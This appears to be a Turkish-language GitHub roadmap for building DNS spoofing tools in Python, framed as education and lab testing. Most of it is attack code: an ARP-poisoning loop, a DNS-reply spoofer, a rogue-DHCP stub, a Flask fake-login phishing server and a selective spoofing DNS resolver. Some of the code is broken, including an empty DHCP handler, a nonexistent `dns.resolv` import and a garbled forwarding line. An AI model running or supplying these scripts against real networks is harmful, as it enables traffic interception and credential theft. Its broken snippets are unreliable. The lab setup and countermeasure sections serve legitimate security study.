
# ROADMAP.md: Python ile DNS Spoofing Özelliklerini Geliştirme ve Test Etme

---

## Giriş

Bu yol haritası, Kali Linux’ta bulunan DNS spoofing araçlarından (Ettercap, Dnsspoof, DNSChef, Bettercap, DDSpoof ve SET) esinlenerek, **Python** kullanılarak bu özelliklerin nasıl geliştirileceği ve test edileceğine dair detaylı bir rehber sunar.  
🛑 **Önemli Uyarı:** Bu bilgiler yalnızca eğitim ve araştırma amaçlıdır. Yetkisiz kullanımı **yasa dışı ve etik dışıdır**. Herhangi bir ağda veya sistemde test yapmadan önce **açık izin** almanız zorunludur.

Bu rehber, DNS spoofing tekniklerini Python ile yeniden oluşturmayı, etik ve yasal sınırlar içinde kalarak kontrollü bir ortamda test etmeyi amaçlar.

GitHub Proje Sayfası:  
🔗 https://github.com/Muratunssal/Muratproje/

---

## Ön Koşullar

**Python 3.x**  
Geliştirme dili olarak Python kullanılmıştır.

### Kütüphaneler

- `scapy`: Paket oluşturma ve ağ manipülasyonu için  
  → `pip install scapy`
- `dnslib`: DNS sunucusu oluşturmak için  
  → `pip install dnslib`
- `flask`: Sahte web sunucusu için  
  → `pip install flask`

### Bilgi Gereksinimleri

- Python programlama temelleri  
- Ağ protokolleri (IP, ARP, DNS, DHCP) hakkında temel bilgi  
- Linux komut satırı kullanımı

### Araçlar

- VirtualBox veya benzeri bir sanallaştırma yazılımı

---

## Test Ortamını Kurma

Güvenli bir test ortamı oluşturmak için aşağıdaki adımları izleyin:

1. **VirtualBox Kurulumu**  
   → VirtualBox’ı indirin ve kurun.

2. **Sanal Makineler (VM) Oluşturma**
   - **Saldırgan VM**: Kali Linux veya herhangi bir Linux dağıtımı
   - **Kurban VM**: Herhangi bir işletim sistemi (ör. Windows, Linux)

3. **Ağ Yapılandırması**  
   - VM’leri yalnızca **dahili** veya **host-only** bir ağda çalışacak şekilde ayarlayın.  
   - Bu, testlerin üretim ağlarından izole olmasını sağlar.

---

## Temel Bileşenlerin Geliştirilmesi

---

### ARP Spoofing Betiği

ARP spoofing, ortadaki adam (MITM) saldırıları için temel bir adımdır. Bu betik, saldırganın MAC adresini ağ geçidinin IP’siyle ilişkilendirmek için sahte ARP yanıtları gönderir.

**Adımlar:**

- Scapy’yi kurun: `pip install scapy`
- IP yönlendirmeyi etkinleştirin:  
  ```bash
  sudo sysctl -w net.ipv4.ip_forward=1
  ```
- ARP spoofing betiği:

```python
from scapy.all import *
import time

def get_mac(ip):
    ans, _ = arping(ip)
    for s, r in ans:
        return r[Ether].src

def arp_spoof(target_ip, gateway_ip):
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    while True:
        send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip), verbose=0)
        send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip), verbose=0)
        time.sleep(2)

arp_spoof('192.168.1.10', '192.168.1.1')
```

---

### DNS Spoofing Betiği

Bu betik, DNS sorgularını yakalar ve sahte yanıtlarla kurbanı yönlendirir.

```python
from scapy.all import *

def dns_spoof(packet):
    if packet.haslayer(DNSQR) and packet[DNS].qr == 0:
        spoofed_ip = "192.168.1.100"  # Saldırganın IP’si
        spoofed_packet = IP(dst=packet[IP].src, src=packet[IP].dst)/                         UDP(dport=packet[UDP].sport, sport=53)/                         DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd,
                             an=DNSRR(name=packet[DNS].qd.qname, ttl=10, rdata=spoofed_ip))
        send(spoofed_packet, verbose=0)

sniff(filter="udp port 53", prn=dns_spoof)
```

---

### DHCP Manipülasyon Betiği

Bu betik, sahte DHCP teklifleriyle istemcilere yanlış bir DNS sunucusu atar (DDSpoof benzeri).

```python
from scapy.all import *

def dhcp_spoof(packet):
    if packet.haslayer(DHCP) and packet[DHCP].options[0][1] == 1:  # Keşif (Discover)
        fake_dns = "192.168.1.100"
        # Sahte DHCP yanıtı oluşturma
        # send(dhcp_offer) gibi bir yapı gerektirir

sniff(filter="udp and (port 67 or 68)", prn=dhcp_spoof)
```

---

### Sahte Web Sunucusu

Kimlik avı veya sahte içerik sunmak için bir web sunucusu oluşturun.

- Flask’ı kurun: `pip install flask`

```python
from flask import Flask, render_template

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('fake_login.html')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
```

- `templates/fake_login.html` dosyasını oluşturun (örneğin, bir giriş sayfası taklidi).

---

## Gelişmiş Geliştirmeler

---

### Seçmeli DNS Spoofing için DNS Proxy

DNSChef gibi belirli alan adlarını spoof eden bir DNS sunucusu oluşturun.

- dnslib’i kurun: `pip install dnslib`

```python
from dnslib import *
from dnslib.server import DNSServer, BaseResolver
import dns.resolv

class SpoofResolver(BaseResolver):
    def resolve(self, request, handler):
        reply = request.reply()
        qname = str(request.q.qname)
        if qname in ['example.com.']:
            reply.add_answer(RR(qname, QTYPE.A, rdata=A('192.168.1.100'), ttl=60))
        else:
            # Gerçek DNS’e yönlendirme
            reply = DNSRecord.parse(dns.resolv.Resolver().query(request.q.qname, request.q.qtype).send())
        return reply

resolver = SpoofResolver()
server = DNSServer(resolver, port=53, address='0.0.0.0')
server.start_thread()
```

---

### Entegre MITM Betiği

Bettercap benzeri bir betikle ARP ve DNS spoofing’i birleştirin.

- Yukarıdaki ARP ve DNS spoofing kodlarını birleştirin  
- Yapılandırma dosyası veya komut satırı argümanlarıyla özelleştirin

---

## Geliştirmelerin Test Edilmesi

- **ARP Spoofing:**
  - Betiği çalıştırın.
  - Kurban VM’de ARP tablosunu kontrol edin (`arp -a`)
  - Ağ geçidinin MAC adresi saldırganınkiyle değişmiş olmalı

- **DNS Spoofing:**
  - Betiği çalıştırın
  - Kurban VM’de bir alan adı çözümleyin (`nslookup example.com`)
  - Sahte IP dönmeli

- **DHCP Manipülasyonu:**
  - Betiği çalıştırın
  - Kurban VM’de IP kirasını yenileyin (`ipconfig /renew` veya `dhclient`)
  - DNS sunucusu sahte IP olmalı

- **Sahte Web Sunucusu:**
  - Kurban VM’den sahte domaine erişin
  - Sahte sayfa görüntülenmeli

---

## Karşı Önlemler ve En İyi Uygulamalar

- 🔒 Statik ARP Girişleri: ARP spoofing’i önler  
- 📛 DNSSEC: DNS sorgularını doğrular  
- 🔐 HTTPS Kullanımı: Sertifika uyarılarına dikkat edin  
- 🕵️ VPN: Trafiği şifreler ve yerel manipülasyonları engeller  
- 🧪 İzole Test Ortamı: Üretim ağlarında test yapmayın  

---

## Sonuç

Bu yol haritası, Python ile DNS spoofing özelliklerini geliştirmeyi ve test etmeyi adım adım açıklamıştır.  
🎯 Etik ve yasal sorumluluklara bağlı kalarak, bu bilgileri **siber güvenliği güçlendirmek** için kullanmaya devam edin.
